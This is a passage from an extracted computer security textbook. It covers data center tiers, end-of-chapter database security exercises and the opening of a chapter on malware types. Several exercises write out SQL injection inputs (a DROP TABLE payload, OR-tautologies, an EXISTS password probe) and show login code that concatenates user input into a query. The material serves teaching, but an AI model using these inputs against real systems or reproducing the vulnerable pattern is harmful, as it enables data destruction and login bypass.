etc.\\r\\nPhysical\\r\\nSecurity\\r\\nSurveillance, Mantraps, Two/three\\r\\nfactor authentication, Security\\r\\nzones, ISO 27001/27002, etc.\\r\\nNetwork\\r\\nSecurity\\r\\nFirewalls, Anti-virus, Intrusion\\r\\ndetection/prevention,\\r\\nauthentication, etc.\\r\\nEncryption, Password policy, secure\\r\\nIDs, Data Protection (ISO 27002),\\r\\nData masking, Data retention, etc.\\r\\nData\\r\\nSecurity\\r\\nM05_STAL0611_04_GE_C05.indd 197 10/11/17 2:49 PM\\n\\n\\n198 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\nThe standard specifies function areas, which helps to define equipment place\\ufffement based on the standard hierarchical design for regular commercial spaces. This \\r\\narchitecture anticipates growth and helps create an environment where applications \\r\\nand servers can be added and upgraded with minimal downtime. This standardized \\r\\napproach supports high availability and a uniform environment for implementing \\r\\nsecurity measures. TIA-942 specifies that a data center should include the following \\r\\nfunctional areas (see Figure 5.13):\\r\\n• Computer room: Portion of the data center that houses date processing equipment.\\r\\n• Entrance room: One or more entrance rooms house external network access \\r\\nprovider equipment, plus provide the interface between the computer room \\r\\nequipment and the enterprise cabling systems. Physical separation of the \\r\\nentrance room from the computer room provides better security.\\r\\n• Main distribution area: A centrally located area that houses the main cross\\ufffeconnect as well as core routers and switches for LAN and SAN (storage area \\r\\nnetwork) infrastructures.\\r\\n• Horizontal distribution area (HDA): Serves as the distribution point for hori\\ufffezontal cabling and houses cross-connects and active equipment for distributing \\r\\ncable to the equipment distribution area.\\r\\nFigure 5.13 TIA-942 Compliant Data Center Showing Key Functional Areas\\r\\nCarriers Carriers\\r\\nComputer\\r\\nRoom\\r\\nEntrance Room\\r\\n(Carrier equipment\\r\\n& demarcation)\\r\\nHoriz Dist Area\\r\\n(LAN/SAN/KVM)\\r\\nHoriz Dist Area\\r\\n(LAN/SAN/KVM)\\r\\nEquip Dist Area\\r\\n(Rack/Cabinet)\\r\\nZone Dist Area\\r\\nEquip Dist Area\\r\\n(Rack/Cabinet)\\r\\nHoriz Dist Area\\r\\n(LAN/SAN/KVM)\\r\\nEquip Dist Area\\r\\n(Rack/Cabinet)\\r\\nBackbone cabling Horizontal cabling\\r\\nOffices,\\r\\nOperations Center\\r\\nSupport Rooms\\r\\nTelecom Room\\r\\ncenter, LAN switches)\\r\\n(Office and operations\\r\\nMain Dist Area\\r\\n(routers, backbone\\r\\nLAN/SAN switches\\r\\nPBX, M13 Muxes)\\r\\nM05_STAL0611_04_GE_C05.indd 198 10/11/17 2:49 PM\\n\\n\\n5.8 / DATA CENTER SECURITY 199\\r\\n• Equipment distribution area (EDA): The location of equipment cabinets and \\r\\nracks, with horizontal cables terminating with patch panels.\\r\\n• Zone distribution area (ZDA): An optional interconnection point in the hori\\ufffezontal cabling between the HDA and EDA. The ZDA can act as a consolidation \\r\\npoint for reconfiguration flexibility or for housing freestanding equipment such \\r\\nas mainframes.\\r\\nAn important part of TIA-942, especially relevant for computer security, is the \\r\\nconcept of tiered reliability. The standard defines four tiers, as shown in Table 5.4. \\r\\nFor each of the four tiers, TIA-942 describes detailed architectural, security, electrical, \\r\\nmechanical, and telecommunications recommendations such that the higher the tier \\r\\nis, the higher will be the availability.\\r\\nTier System Design Availability/Annual Downtime\\r\\n1 • Susceptible to disruptions from both planned and unplanned \\r\\nactivity\\r\\n• Single path for power and cooling distribution, no redundant \\r\\ncomponents\\r\\n• May or may not have raised floor, UPS, or generator\\r\\n• Takes 3 months to implement\\r\\n• Must be shut down completely to perform preventive \\r\\nmaintenance\\r\\n99.671%/28.8 hours\\r\\n2 • Less susceptible to disruptions from both planned and \\r\\nunplanned activity\\r\\n• Single path for power and cooling distribution, includes \\r\\nredundant components\\r\\n• Includes raised floor, UPS, and generator\\r\\n• Takes 3 to 6 months to implement\\r\\n• Maintenance of power path and other parts of the \\r\\ninfrastructure require a processing shutdown\\r\\n99.741%/22.0 hours\\r\\n3 • Enables planned activity without disrupting computer \\r\\nhardware operation but unplanned events will still cause \\r\\ndisruption\\r\\n• Multiple power and cooling distribution paths but with only \\r\\none path active, includes redundant components\\r\\n• Takes 15 to 20 months to implement\\r\\n• Includes raised floor and sufficient capacity and distribution \\r\\nto carry load on one path while performing maintenance on \\r\\nthe other\\r\\n99.982%/1.6 hours\\r\\n4 • Planned activity does not disrupt critical load and data center \\r\\ncan sustain at least one worst-case unplanned event with no \\r\\ncritical load impact\\r\\n• Multiple active power and cooling distribution paths, includes \\r\\nredundant components\\r\\n• Takes 15 to 20 months to implement\\r\\n99.995%/0.4 hours\\r\\nTable 5.4 Data Center Tiers Defined in TIA-942\\r\\nM05_STAL0611_04_GE_C05.indd 199 10/11/17 2:49 PM\\n\\n\\n200 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\n5.9 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\r\\nKey Terms\\r\\nattribute\\r\\nblind SQL injection\\r\\ncascading authorizations\\r\\ncompromise\\r\\ndata center\\r\\ndata swapping\\r\\ndatabase\\r\\ndatabase access control\\r\\ndatabase encryption\\r\\ndatabase management system \\r\\n(DBMS)\\r\\ndefensive coding\\r\\ndetection\\r\\nend-of-line comment\\r\\nforeign key\\r\\ninband attack\\r\\ninference\\r\\ninference channel\\r\\ninferential attack\\r\\nout-of-band attack\\r\\nparameterized query insertion\\r\\npartitioning\\r\\npiggybacked queries\\r\\nprimary key\\r\\nquery language\\r\\nquery set\\r\\nrelation\\r\\nrelational database\\r\\nrelational database manage\\ufffement system (RDBMS)\\r\\nrun-time prevention\\r\\nStructured Query Language \\r\\n(SQL)\\r\\nSQL injection (SQLi) attack\\r\\ntautology\\r\\ntuple\\r\\nview\\r\\nReview Questions\\r\\n5.1 Define the terms database, database management system, and query language.\\r\\n5.2 What is a relational database and what are its principal ingredients?\\r\\n5.3 What is an SQL injection attack?\\r\\n5.4 What are the implications of an SQL injection attack?\\r\\n5.5 List the categories for grouping different types of SQLi attacks.\\r\\n5.6 Why is RBAC considered fit for database access control?\\r\\n5.7 State the different levels at which encryption can be applied to a database.\\r\\n5.8 List and briefly define four data center availability tiers.\\r\\nProblems\\r\\n5.1 Consider a simplified database for an organization that includes information of sev\\ufffeeral departments (identity, name, manager, number of employees) and of managers \\r\\nand employees of the respective departments. Suggest a relational database for effi\\ufffeciently managing this information.\\r\\n5.2 The following table provides information on students of a computer programming \\r\\nclub.\\r\\nStudent-ID Name Skill Level Age\\r\\n99 Jimmy Beginner 20\\r\\n36 David Experienced 22\\r\\n82 Oliver Medium 21\\r\\n23 Alice Experienced 21\\r\\nM05_STAL0611_04_GE_C05.indd 200 10/11/17 2:49 PM\\n\\n\\n5.9 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 201\\r\\n The primary key is Student-ID. Explain whether or not each of the following rows can \\r\\nbe added to the table.\\r\\nStudent-ID Name Skill Level Age\\r\\n91 Tom Experienced 22\\r\\n36 Dave Experienced 21\\r\\nBob Beginner 20\\r\\n5.3 The following table shows a list of cars and their owners that is used by a car service \\r\\nstation.\\r\\nC_Name Model Company DOP Owner O_Phone O_E-mail\\r\\nCamaro 2LS Chevrolet 9/9/06 David 2132133 dd@abc.com\\r\\nFalcon XR6 Ford 2/21/07 Dave 1245513 dv@abc.com\\r\\nCruze LT Chevrolet 5/12/12 David 1452321 dd@abc.com\\r\\nCamaro 2LT Chevrolet 7/6/10 Alice 3253254 al@ab.com\\r\\nRoadster Roadster Tesla 1/20/13 Dave 2353253 dv@abc.com\\r\\nFocus S Ford 4/10/12 Oliver 3251666 ol@abc.com\\r\\nModel X Model X Tesla 3/9/14 Bob 7567443 bb@abc.com\\r\\na. Describe the problems that are likely to occur when using this table.\\r\\nb. Break the table into two tables in a way that fixes the problems.\\r\\n5.4 We wish to create an employee table containing the employee’s ID number, first \\r\\nname, last name, and department. Write an SQL statement to accomplish this.\\r\\n5.5 Consider an SQL statement:\\r\\nSELECT id, forename, surname FROM authors WHERE forename = ‘david’ AND \\r\\nid = 939\\r\\na. What is this statement trying to search from the database?\\r\\nb. Assume that the firstname and id fields are being gathered from user-supplied \\r\\ninput, and suppose the user responds with:\\r\\nFirstname: david’; drop table employees - -\\r\\nid: 939:\\r\\nWhat will be the effect?\\r\\nc. Now suppose the user responds with:\\r\\nfirstname: ’ OR 9 = 9 - -\\r\\nid: 939\\r\\nWhat will be the effect?\\r\\n5.6 Figure 5.14 shows a fragment of code that implements the login functionality for a \\r\\ndatabase application. The code dynamically builds an SQL query and submits it to a \\r\\ndatabase.\\r\\na. Suppose a user submits login, password, and pin as Mike, Mike@256, and 4242. \\r\\nWrite the SQL query that is generated.\\r\\nb. If, instead of the previous inputs, the user submits for each of the login, password \\r\\nand pin fields:\\r\\n\\' or \\'\\' = \\'\\r\\nWhat is the effect?\\r\\nM05_STAL0611_04_GE_C05.indd 201 10/11/17 2:49 PM\\n\\n\\n202 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\n1. String login, password, pin, query\\r\\n2. login = getParameter(“login”);\\r\\n3. password = getParameter(“pass”);\\r\\n3. pin = getParameter(“pin”);\\r\\n4. Connection conn.createConnection(“MyDataBase”);\\r\\n5. query = “SELECT accounts FROM users WHERE login=’” +\\r\\n6. login + “‘AND pass = ’” + password +\\r\\n7. “‘AND pin=” + pin;\\r\\n8. ResultSet result = conn.executeQuery(query);\\r\\n9. if (result!=NULL)\\r\\n10 displayAccounts(result);\\r\\n11 else\\r\\n12 displayAuthFailed();\\r\\nFigure 5.14 Code for Generating an SQL Query\\r\\n5.7 The EXISTS operator is used to test for the existence of any record in a subquery. \\r\\nSuppose you know that a user with the login Mike exists in the user table but you do \\r\\nnot know their password. You enter the following in the login field:\\r\\n’ OR EXISTS (SELECT * FROM users WHERE name = ‘Mike’ AND password \\r\\nLIKE ‘%t%’) –\\r\\nWhat is the effect?\\r\\n5.8 Assume A, B, and C grant certain privileges on the employee table to X, who in turn \\r\\ngrants them to Y, as shown in the following table, with the numerical entries indicating \\r\\nthe time of granting:\\r\\nUserID Table Grantor READ INSERT DELETE\\r\\nX Employee A 15 15 —\\r\\nX Employee B 20 — 20\\r\\nY Employee X 25 25 25\\r\\nX Employee C 30 — 30\\r\\nAt time t = 35, B issues the command REVOKE ALL RIGHTS ON Employee \\r\\nFROM X. Which access rights, if any, of Y must be revoked, using the conventions \\r\\ndefined in Section 5.2?\\r\\n5.9 Figure 5.15 shows a sequence of grant operations for a specific access right on a table. \\r\\nAssume at t = 70, B revokes the access right from C. Using the conventions defined \\r\\nin Section 5.2, show the resulting diagram of access right dependencies.\\r\\nFigure 5.15 Cascaded Privileges\\r\\nA\\r\\nB\\r\\nC D E\\r\\nt = 60\\r\\nt = 50\\r\\nt = 30\\r\\nt = 40\\r\\nt = 20\\r\\nt = 10\\r\\nM05_STAL0611_04_GE_C05.indd 202 10/11/17 2:49 PM\\n\\n\\n5.9 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 203\\r\\n5.10 Figure 5.16 shows an alternative convention for handling revocations of the type illus\\ufffetrated in Figure 5.6.\\r\\nFigure 5.16 Bob Revokes Privilege from David, Second Version\\r\\nAnn\\r\\nBob\\r\\nChris\\r\\nDavid Frank\\r\\nEllen Jim t = 70\\r\\nt = 60\\r\\nt = 40\\r\\nt = 30\\r\\nt = 50\\r\\nt = 10\\r\\nt = 20\\r\\nAnn\\r\\nBob\\r\\nChris\\r\\nDavid Frank\\r\\nEllen Jim t = 70\\r\\nt = 60\\r\\nt = 40\\r\\nt = 60\\r\\nt = 50\\r\\nt = 10\\r\\nt = 20\\r\\na. Describe an algorithm for revocation that fits this figure.\\r\\nb. Compare the relative advantages and disadvantages of this method to the original \\r\\nmethod, illustrated in Figure 5.6.\\r\\n5.11 Consider the parts department of a plumbing contractor. The department maintains \\r\\nan inventory database that includes parts information (part number, description, \\r\\ncolor, size, number in stock, etc.) and information on vendors from whom parts are \\r\\nobtained (name, address, pending purchase orders, closed purchase orders, etc.). In an \\r\\nRBAC system, suppose roles are defined for accounts payable clerk, an installation \\r\\nforeman, and a receiving clerk. For each role, indicate which items should be acces\\ufffesible for read-only and read-write access.\\r\\n5.12 Imagine you are the database administrator for a military transportation system. You \\r\\nhave a table named cargo in your database that contains information on the various \\r\\ncargo holds available on each outbound airplane. Each row in the table represents a \\r\\nsingle shipment and lists the contents of that shipment and the flight identification \\r\\nnumber. Only one shipment per hold is allowed. The flight identification number may \\r\\nbe cross-referenced with other tables to determine the origin, destination, flight time, \\r\\nand similar data. The cargo table appears as follows:\\r\\nFlight ID Cargo Hold Contents Classification\\r\\n1254 A Boots Unclassified\\r\\n1254 B Guns Unclassified\\r\\n1254 C Atomic bomb Top Secret\\r\\n1254 D Butter Unclassified\\r\\nM05_STAL0611_04_GE_C05.indd 203 10/11/17 2:49 PM\\n\\n\\n204 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\nSuppose two roles are defined: Role 1 has full access rights to the cargo table. Role 2 \\r\\nhas full access rights only to rows of the table in which the Classification field has the \\r\\nvalue Unclassified. Describe a scenario in which a user assigned to role 2 uses one or \\r\\nmore queries to determine that there is a classified shipment on board the aircraft.\\r\\n5.13 Users hulkhogan and undertaker do not have the SELECT access right to the Inven\\ufffetory table and the Item table. These tables were created by and are owned by user \\r\\nbruno-s. Write the SQL commands that would enable bruno-s to grant SELECT \\r\\naccess to these tables to hulkhogan and undertaker.\\r\\n5.14 In the example of Section 5.6 involving the addition of a start-date column to a set \\r\\nof tables defining employee information, it was stated that a straightforward way to \\r\\nremove the inference channel is to add the start-date column to the employees table. \\r\\nSuggest another way.\\r\\n5.15 Consider a database table that includes a salary attribute. Suppose the three queries \\r\\nsum, count, and max (in that order) are made on the salary attribute, all conditioned \\r\\non the same predicate involving other attributes. That is, a specific subset of records \\r\\nis selected and the three queries are performed on that subset. Suppose the first two \\r\\nqueries are answered, and the third query is denied. Is any information leaked?\\r\\nM05_STAL0611_04_GE_C05.indd 204 10/11/17 2:49 PM\\n\\n\\n205\\r\\n6.1 Types of Malicious Software (Malware)\\r\\nA Broad Classification of Malware\\r\\nAttack Kits\\r\\nAttack Sources\\r\\n6.2 Advanced Persistent Threat\\r\\n6.3 Propagation—Infected Content—Viruses\\r\\nThe Nature of Viruses\\r\\nMacro and Scripting Viruses\\r\\nViruses Classification\\r\\n6.4 Propagation—Vulnerability Exploit—Worms\\r\\nTarget Discovery\\r\\nWorm Propagation Model\\r\\nThe Morris Worm\\r\\nA Brief History of Worm Attacks\\r\\nState of Worm Technology\\r\\nMobile Code\\r\\nMobile Phone Worms\\r\\nClient-Side Vulnerabilities and Drive-by-Downloads\\r\\nClickjacking\\r\\n6.5 Propagation—Social Engineering—Spam E-Mail, Trojans\\r\\nSpam (Unsolicited Bulk) E-Mail\\r\\nTrojan Horses\\r\\nMobile Phone Trojans\\r\\n6.6 Payload—System Corruption\\r\\nData Destruction\\r\\nReal-World Damage\\r\\nLogic Bomb\\r\\n6.7 Payload—Attack Agent—Zombie, Bots\\r\\nUses of Bots\\r\\nRemote Control Facility\\r\\n6.8 Payload—Information Theft—Keyloggers, Phishing, Spyware\\r\\nCredential Theft, Keyloggers, and Spyware\\r\\nPhishing and Identity Theft\\r\\nReconnaissance, Espionage, and Data Exfiltration\\r\\nMalicious Software\\r\\nCHAPTER \\r\\nM06_STAL0611_04_GE_C06.indd 205 10/11/17 2:51 PM\\n\\n\\n206 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nMalicious software, or malware, arguably constitutes one of the most significant cat\\ufffeegories of threats to computer systems. NIST SP 800-83 (Guide to Malware Incident \\r\\nPrevention and Handling for Desktops and Laptops, July 2013) defines malware as \\r\\n“a program that is inserted into a system, usually covertly, with the intent of com\\ufffepromising the confidentiality, integrity, or availability of the victim’s data, applica\\ufffetions, or operating system or otherwise annoying or disrupting the victim.” Hence, \\r\\nwe are concerned with the threat malware poses to application programs, to utility \\r\\nprograms such as editors and compilers, and to kernel-level programs. We are also \\r\\nconcerned with its use on compromised or malicious websites and servers, or in espe\\ufffecially crafted spam e-mails or other messages, which aim to trick users into revealing \\r\\nsensitive personal information.\\r\\nThis chapter examines the wide spectrum of malware threats and counter\\ufffemeasures. We begin with a survey of various types of malware, and offer a broad \\r\\nclassification based first on the means malware uses to spread or propagate, then \\r\\non the variety of actions or payloads used once the malware has reached a target. \\r\\nPropagation mechanisms include those used by viruses, worms, and Trojans. Payloads \\r\\ninclude system corruption, bots, phishing, spyware, and rootkits. The discussion con\\ufffecludes with a review of countermeasure approaches.\\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ Describe three broad mechanisms malware uses to propagate.\\r\\n◆ Understand the basic operation of viruses, worms, and Trojans.\\r\\n◆ Describe four broad categories of malware payloads.\\r\\n◆ Understand the different threats posed by bots, spyware, and rootkits.\\r\\n◆ Describe some malware countermeasure elements.\\r\\n◆ Describe three locations for malware detection mechanisms.\\r\\n6.9 Payload—Stealthing—Backdoors, Rootkits\\r\\nBackdoor\\r\\nRootkit\\r\\nKernel Mode Rootkits\\r\\nVirtual Machine and Other External Rootkits\\r\\n6.10 Countermeasures\\r\\nMalware Countermeasure Approaches\\r\\nHost-Based Scanners and Signature-Based Anti-Virus\\r\\nPerimeter Scanning Approaches\\r\\nDistributed Intelligence Gathering Approaches\\r\\n6.11 Key Terms, Review Questions, and Problems\\r\\nM06_STAL0611_04_GE_C06.indd 206 10/11/17 2:51 PM\\n\\n\\n6.1 / TYPES OF MALICIOUS SOFTWARE (MALWARE) 207\\r\\nName Description\\r\\nAdvanced Persistent \\r\\nThreat (APT)\\r\\nCybercrime directed at business and political targets, using a wide variety of intru\\ufffesion technologies and malware, applied persistently and effectively to specific \\r\\ntargets over an extended period, often attributed to state-sponsored organizations.\\r\\nAdware Advertising that is integrated into software. It can result in pop-up ads or \\r\\nredirection of a browser to a commercial site.\\r\\nAttack kit Set of tools for generating new malware automatically using a variety of supplied \\r\\npropagation and payload mechanisms.\\r\\nAuto-rooter Malicious hacker tools used to break into new machines remotely.\\r\\nBackdoor (trapdoor) Any mechanism that bypasses a normal security check; it may allow unauthorized \\r\\naccess to functionality in a program, or onto a compromised system.\\r\\nDownloaders Code that installs other items on a machine that is under attack. It is normally \\r\\nincluded in the malware code first inserted on to a compromised system to then \\r\\nimport a larger malware package.\\r\\nDrive-by-download An attack using code on a compromised website that exploits a browser \\r\\nvulnerability to attack a client system when the site is viewed.\\r\\nExploits Code specific to a single vulnerability or set of vulnerabilities.\\r\\nFlooders (DoS client) Used to generate a large volume of data to attack networked computer systems, \\r\\nby carrying out some form of denial-of-service (DoS) attack.\\r\\nKeyloggers Captures keystrokes on a compromised system.\\r\\nLogic bomb Code inserted into malware by an intruder. A logic bomb lies dormant until a \\r\\npredefined condition is met; the code then triggers some payload.\\r\\nMacro virus A type of virus that uses macro or scripting code, typically embedded in a \\r\\ndocument or document template, and triggered when the document is viewed or \\r\\nedited, to run and replicate itself into other such documents.\\r\\nMobile code Software (e.g., script and macro) that can be shipped unchanged to a heteroge\\ufffeneous collection of platforms and execute with identical semantics.\\r\\nRootkit Set of hacker tools used after attacker has broken into a computer system and \\r\\ngained root-level access.\\r\\nSpammer programs Used to send large volumes of unwanted e-mail.\\r\\nSpyware Software that collects information from a computer and transmits it to another \\r\\nsystem by monitoring keystrokes, screen data, and/or network traffic; or by scan\\ufffening files on the system for sensitive information.\\r\\nTrojan horse A computer program that appears to have a useful function, but also has a hidden \\r\\nand potentially malicious function that evades security mechanisms, sometimes by \\r\\nexploiting legitimate authorizations of a system entity that invokes it.\\r\\nVirus Malware that, when executed, tries to replicate itself into other executable \\r\\nmachine or script code; when it succeeds, the code is said to be infected. When the \\r\\ninfected code is executed, the virus also executes.\\r\\nTable 6.1 Terminology for Malicious Software (Malware)\\r\\n6.1 TYPES OF MALICIOUS SOFTWARE (MALWARE)\\r\\nThe terminology in this area presents problems because of a lack of universal agree\\ufffement on all of the terms and because some of the categories overlap. Table 6.1 is a \\r\\nuseful guide to some of the terms in use.\\r\\n(continued)\\r\\nM06_STAL0611_04_GE_C06.indd 207 10/11/17 2:51 PM\\n\\n\\n208 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nA Broad Classification of Malware\\r\\nA number of authors attempt to classify malware, as shown in the survey and proposal \\r\\nof [HANS04]. Although a range of aspects can be used, one useful approach classifies \\r\\nmalware into two broad categories, based first on how it spreads or propagates to reach \\r\\nthe desired targets, then on the actions or payloads it performs once a target is reached.\\r\\nPropagation mechanisms include infection of existing executable or interpreted \\r\\ncontent by viruses that is subsequently spread to other systems; exploit of software \\r\\nvulnerabilities either locally or over a network by worms or drive-by-downloads to \\r\\nallow the malware to replicate; and social engineering attacks that convince users \\r\\nto bypass security mechanisms to install Trojans, or to respond to phishing attacks.\\r\\nEarlier approaches to malware classification distinguished between those that \\r\\nneed a host program, being parasitic code such as viruses, and those that are inde\\ufffependent, self-contained programs run on the system such as worms, Trojans, and \\r\\nbots. Another distinction used was between malware that does not replicate, such \\r\\nas Trojans and spam e-mail, and malware that does, including viruses and worms.\\r\\nPayload actions performed by malware once it reaches a target system can \\r\\ninclude corruption of system or data files; theft of service in order to make the system \\r\\na zombie agent of attack as part of a botnet; theft of information from the system, \\r\\nespecially of logins, passwords, or other personal details by keylogging or spyware \\r\\nprograms; and stealthing where the malware hides its presence on the system from \\r\\nattempts to detect and block it.\\r\\nWhile early malware tended to use a single means of propagation to deliver a \\r\\nsingle payload, as it evolved, we see a growth of blended malware that incorporates a \\r\\nrange of both propagation mechanisms and payloads that increase its ability to spread, \\r\\nhide, and perform a range of actions on targets. A blended attack uses multiple meth\\ufffeods of infection or propagation to maximize the speed of contagion and the severity \\r\\nof the attack. Some malware even support an update mechanism that allows it to \\r\\nchange the range of propagation and payload mechanisms utilized once it is deployed.\\r\\nIn the following sections, we survey these various categories of malware, then \\r\\nfollow with a discussion of appropriate countermeasures.\\r\\nAttack Kits\\r\\nInitially, the development and deployment of malware required considerable techni\\ufffecal skill by software authors. This changed with the development of virus-creation\\r\\ntoolkits in the early 1990s, and later of more general attack kits in the 2000s. \\r\\nThese greatly assisted in the development and deployment of malware [FOSS10]. \\r\\nThese toolkits, often known as crimeware, now include a variety of propagation \\r\\nmechanisms and payload modules that even novices can combine, select, and deploy. \\r\\nName Description\\r\\nWorm A computer program that can run independently and can propagate a complete \\r\\nworking version of itself onto other hosts on a network, by exploiting software \\r\\nvulnerabilities in the target system, or using captured authorization credentials.\\r\\nZombie, bot Program installed on an infected machine that is activated to launch attacks on \\r\\nother machines.\\r\\nTable 6.1 Terminology for Malicious Software (Malware) (Continued)\\r\\nM06_STAL0611_04_GE_C06.indd 208 10/11/17 2:51 PM\\n\\n\\n6.2 / ADVANCED PERSISTENT THREAT 209\\r\\nThey can also easily be customized with the latest discovered vulnerabilities in order \\r\\nto exploit the window of opportunity between the publication of a weakness and \\r\\nthe widespread deployment of patches to close it. These kits greatly enlarged the \\r\\npopulation of attackers able to deploy malware. Although the malware created with \\r\\nsuch toolkits tends to be less sophisticated than that designed from scratch, the sheer \\r\\nnumber of new variants that can be generated by attackers using these toolkits \\r\\ncreates a significant problem for those defending systems against them.\\r\\nThe Zeus crimeware toolkit is a prominent example of such an attack kit, which was \\r\\nused to generate a wide range of very effective, stealthed malware that facilitates a range \\r\\nof criminal activities, in particular capturing and exploiting banking credentials [BINS10]. \\r\\nThe Angler exploit kit, first seen in 2013, was the most active kit seen in 2015, often \\r\\ndistributed via malvertising that exploited Flash vulnerabilities. It is sophisticated and \\r\\ntechnically advanced, in both attacks executed and counter-measures deployed to resist \\r\\ndetection. There are a number of other attack kits in active use, though the specific kits \\r\\nchange from year to year as attackers continue to evolve and improve them [SYMA16].\\r\\nAttack Sources\\r\\nAnother significant malware development over the last couple of decades is the \\r\\nchange from attackers being individuals, often motivated to demonstrate their techni\\ufffecal competence to their peers, to more organized and dangerous attack sources. These \\r\\ninclude politically motivated attackers, criminals, and organized crime; organizations \\r\\nthat sell their services to companies and nations, and national government agencies, \\r\\nas we will discuss in Section 8.1. This has significantly changed the resources available \\r\\nand motivation behind the rise of malware, and indeed has led to the development of \\r\\na large underground economy involving the sale of attack kits, access to compromised \\r\\nhosts, and to stolen information.\\r\\n6.2 ADVANCED PERSISTENT THREAT\\r\\nAdvanced Persistent Threats (APTs) have risen to prominence in recent years. These \\r\\nare not a new type of malware, but rather the well-resourced, persistent application of \\r\\na wide variety of intrusion technologies and malware to selected targets, usually busi\\ufffeness or political. APTs are typically attributed to state-sponsored organizations, with \\r\\nsome attacks likely from criminal enterprises as well. We will discuss these categories \\r\\nof intruders further in Section 8.1.\\r\\nAPTs differ from other types of attack by their careful target selection, and \\r\\npersistent, often stealthy, intrusion efforts over extended periods. A number of \\r\\nhigh-profile attacks, including Aurora, RSA, APT1, and Stuxnet, are often cited as \\r\\nexamples. They are named as a result of these characteristics:\\r\\n• Advanced: Use by the attackers of a wide variety of intrusion technologies \\r\\nand malware, including the development of custom malware if required. The \\r\\nindividual components may not necessarily be technically advanced, but are \\r\\ncarefully selected to suit the chosen target.\\r\\n• Persistent: Determined application of the attacks over an extended period against \\r\\nthe chosen target in order to maximize the chance of success. A variety of attacks \\r\\nmay be progressively, and often stealthily, applied until the target is compromised.\\r\\nM06_STAL0611_04_GE_C06.indd 209 10/11/17 2:51 PM\\n\\n\\n210 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\n• Threats: Threats to the selected targets as a result of the organized, capable, and \\r\\nwell-funded attackers intent to compromise the specifically chosen targets. The \\r\\nactive involvement of people in the process greatly raises the threat level from \\r\\nthat due to automated attacks tools, and also the likelihood of successful attack.\\r\\nThe aim of these attacks varies from theft of intellectual property or security\\ufffeand infrastructure- related data to the physical disruption of infrastructure. Techniques\\r\\nused include social engineering, spear-phishing e-mails, and drive-by-downloads\\r\\nfrom selected compromised Web sites likely to be visited by personnel in the target \\r\\norganization. The intent is to infect the target with sophisticated malware with mul\\ufffetiple propagation mechanisms and payloads. Once they have gained initial access to \\r\\nsystems in the target organization, a further range of attack tools are used to maintain \\r\\nand extend their access.\\r\\nAs a result, these attacks are much harder to defend against due to this specific \\r\\ntargeting and persistence. It requires a combination of technical countermeasures, \\r\\nsuch as we will discuss later in this chapter, as well as awareness training to assist per\\ufffesonnel to resist such attacks, as we will discuss in Chapter 17. Even with current best\\ufffepractice countermeasures, the use of zero-day exploits and new attack approaches \\r\\nmeans that some of these attacks are likely to succeed [SYMA16, MAND13]. Thus \\r\\nmultiple layers of defense are needed, with mechanisms to detect, respond, and miti\\ufffegate such attacks. These may include monitoring for malware command and control \\r\\ntraffic, and detection of exfiltration traffic.\\r\\n6.3 PROPAGATION—INFECTED CONTENT—VIRUSES\\r\\nThe first category of malware propagation concerns parasitic software fragments that \\r\\nattach themselves to some existing executable content. The fragment may be machine \\r\\ncode that infects some existing application, utility, or system program, or even the \\r\\ncode used to boot a computer system. Computer virus infections formed the major\\ufffeity of malware seen in the early personal computer era. The term “computer virus” \\r\\nis still often used to refer to malware in general, rather than just computer viruses \\r\\nspecifically. More recently, the virus software fragment has been some form of script\\ufffeing code, typically used to support active content within data files such as Microsoft \\r\\nWord documents, Excel spreadsheets, or Adobe PDF documents.\\r\\nThe Nature of Viruses\\r\\nA computer virus is a piece of software that can “infect” other programs, or indeed any \\r\\ntype of executable content, by modifying them. The modification includes injecting \\r\\nthe original code with a routine to make copies of the virus code, which can then go \\r\\non to infect other content. Computer viruses first appeared in the early 1980s, and the \\r\\nterm itself is attributed to Fred Cohen. Cohen is the author of a groundbreaking book \\r\\non the subject [COHE94]. The Brain virus, first seen in 1986, was one of the first to \\r\\ntarget MSDOS systems, and resulted in a significant number of infections for this time.\\r\\nBiological viruses are tiny scraps of genetic code—DNA or RNA—that can take \\r\\nover the machinery of a living cell and trick it into making thousands of flawless rep\\ufffelicas of the original virus. Like its biological counterpart, a computer virus carries in \\r\\nM06_STAL0611_04_GE_C06.indd 210 10/11/17 2:51 PM\\n\\n\\n6.3 / PROPAGATION—INFECTED CONTENT—VIRUSES 211\\r\\nits instructional code the recipe for making perfect copies of itself. The typical virus \\r\\nbecomes embedded in a program, or carrier of executable content, on a computer. Then, \\r\\nwhenever the infected computer comes into contact with an uninfected piece of code, a \\r\\nfresh copy of the virus passes into the new location. Thus, the infection can spread from \\r\\ncomputer to computer, aided by unsuspecting users, who exchange these programs or \\r\\ncarrier files on disk or USB stick; or who send them to one another over a network. \\r\\nIn a network environment, the ability to access documents, applications, and system \\r\\nservices on other computers provides a perfect culture for the spread of such viral code.\\r\\nA virus that attaches to an executable program can do anything that the pro\\ufffegram is permitted to do. It executes secretly when the host program is run. Once \\r\\nthe virus code is executing, it can perform any function, such as erasing files and \\r\\nprograms, that is allowed by the privileges of the current user. One reason viruses \\r\\ndominated the malware scene in earlier years was the lack of user authentication \\r\\nand access controls on personal computer systems at that time. This enabled a virus \\r\\nto infect any executable content on the system. The significant quantity of programs \\r\\nshared on floppy disk also enabled its easy, if somewhat slow, spread. The inclusion \\r\\nof tighter access controls on modern operating systems significantly hinders the ease \\r\\nof infection of such traditional, machine executable code, viruses. This resulted in \\r\\nthe development of macro viruses that exploit the active content supported by some \\r\\ndocuments types, such as Microsoft Word or Excel files, or Adobe PDF documents. \\r\\nSuch documents are easily modified and shared by users as part of their normal sys\\ufffetem use, and are not protected by the same access controls as programs. Currently, \\r\\na viral mode of infection is typically one of several propagation mechanisms used \\r\\nby contemporary malware, which may also include worm and Trojan capabilities.\\r\\n[AYCO06] states that a computer virus has three parts. More generally, many \\r\\ncontemporary types of malware also include one or more variants of each of these \\r\\ncomponents:\\r\\n• Infection mechanism: The means by which a virus spreads or propagates, 